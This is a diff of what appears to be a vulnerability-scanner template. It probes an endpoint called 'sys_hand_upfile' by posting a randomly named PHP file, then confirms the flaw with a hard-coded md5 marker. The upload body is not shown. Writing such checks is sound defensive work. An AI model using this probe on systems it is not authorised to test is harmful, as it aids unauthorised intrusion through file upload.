@@ -24,7 +24,7 @@ info:
 
 variables:
   filename: '{{rand_base(6)}}.php'
-  md5_value: "{{md5('99999999')}}"
+  md5_value: "ef775988943825d2871e1cfa75473ec0"
 
 http:
   - raw:
@@ -32,7 +32,7 @@ http:
         POST /?g=sys_hand_upfile HTTP/1.1
         Host: {{Hostname}}
         User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/3.0)
-        Content-Length: {{content_length}}
+        Content-Length: 319
         Accept: */*
         Accept-Encoding: gzip, deflate, br
         Connection: keep-alive
@@ -61,4 +61,4 @@ http:
       - type: word
         part: body
         words:
-          - "{{md5_value}}"
+          - "ef775988943825d2871e1cfa75473ec0"
